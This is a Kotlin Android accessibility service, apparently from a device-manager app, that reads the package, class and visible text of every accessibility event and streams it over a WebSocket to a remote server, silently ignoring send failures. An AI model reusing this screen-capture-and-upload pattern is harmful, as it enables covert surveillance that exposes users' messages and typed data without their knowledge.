package com.example.service

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.example.DeviceManagerApp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class DeviceAccessibilityService : AccessibilityService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onServiceConnected() {
        Log.d("AccessibilityService", "DeviceAccessibilityService is connected!")
        try {
            val app = application as? DeviceManagerApp
            app?.repository?.let { repo ->
                serviceScope.launch {
                    repo.syncPermissions()
                }
            }
        } catch (e: Exception) {
            Log.e("AccessibilityService", "Error syncing permissions on connect: ${e.message}")
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: ""
        val className = event.className?.toString() ?: ""

        val textList = event.text
        val textBuilder = StringBuilder()
        for (t in textList) {
            if (!t.isNullOrBlank()) {
                textBuilder.append(t).append(" ")
            }
        }
        val textStr = textBuilder.toString().trim()

        if (packageName.isNotEmpty()) {
            try {
                val wsManager = DeviceManagerApp.instance.webSocketManager
                wsManager.sendAccessibilityEvent(packageName, className, textStr)
            } catch (e: Exception) {
                // Safely ignore if socket or app not ready
            }
        }
    }

    override fun onInterrupt() {
        Log.d("AccessibilityService", "Accessibility interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("AccessibilityService", "Accessibility destroyed")
    }
}
